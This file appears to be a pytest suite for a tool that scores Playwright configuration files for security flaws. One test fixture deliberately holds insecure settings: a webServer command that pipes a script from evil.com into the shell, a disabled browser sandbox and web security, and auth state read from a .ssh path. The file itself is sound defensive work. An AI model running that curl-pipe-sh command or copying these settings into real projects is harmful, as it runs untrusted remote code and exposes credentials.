"""Tests for PlaywrightAnalyzer."""

import json
from pathlib import Path

from devai.playwright_analyzer import PlaywrightAnalyzer, PlaywrightFinding


INSECURE_PLAYWRIGHT_CONFIG = """\
import { defineConfig } from "@playwright/test";

export default defineConfig({
  use: {
    baseURL: "http://insecure.example.com",
    ignoreHTTPSErrors: true,
    bypassCSP: true,
    storageState: "../.ssh/auth.json",
    trace: "on",
    headless: false,
  },
  outputDir: "/tmp/playwright-results",
  webServer: {
    command: "curl http://evil.com/setup.sh | sh",
    url: "http://localhost:3000",
  },
  projects: [
    {
      name: "chromium",
      use: {
        launchOptions: {
          args: ["--no-sandbox", "--disable-web-security"],
        },
      },
    },
  ],
});
"""

HARDENED_PLAYWRIGHT = """\
import { defineConfig } from "@playwright/test";

export default defineConfig({
  use: {
    baseURL: "http://localhost:3000",
    ignoreHTTPSErrors: false,
    bypassCSP: false,
    trace: "on-first-retry",
  },
});
"""


class TestPlaywrightAnalyzer:
    def test_detects_insecure_playwright_config(self, tmp_path: Path):
        (tmp_path / "playwright.config.ts").write_text(
            INSECURE_PLAYWRIGHT_CONFIG, encoding="utf-8"
        )
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "tls_bypass" in kinds
        assert "sandbox_disabled" in kinds
        assert "insecure_http" in kinds
        assert "storage_state_outside" in kinds
        assert "artifact_leak" in kinds
        assert analyzer.health_score() < 50.0

    def test_detects_remote_debug(self, tmp_path: Path):
        (tmp_path / "playwright.config.js").write_text(
            'export default { use: { launchOptions: { args: ["--remote-debugging-port=9222"] } } };\n',
            encoding="utf-8",
        )
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "remote_debug" in kinds

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "playwright.config.ts").write_text(HARDENED_PLAYWRIGHT, encoding="utf-8")
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Playwright configs: none found"

    def test_detects_package_json_playwright_block(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            json.dumps({"playwright": {"ignoreHTTPSErrors": True}}),
            encoding="utf-8",
        )
        analyzer = PlaywrightAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "tls_bypass" in kinds

    def test_finding_format(self):
        finding = PlaywrightFinding(
            kind="tls_bypass",
            severity="high",
            message="test",
            path="playwright.config.ts",
            lineno=5,
        )
        assert "[high] playwright.config.ts:5" in finding.format()

    def test_generate_hardened_template(self):
        template = PlaywrightAnalyzer(".").generate_hardened_template()
        assert "ignoreHTTPSErrors: false" in template
        assert "on-first-retry" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "playwright.config.ts").write_text(
            INSECURE_PLAYWRIGHT_CONFIG, encoding="utf-8"
        )
        context = PlaywrightAnalyzer(str(tmp_path)).to_context()
        assert "Playwright analysis:" in context
        assert "health score:" in context
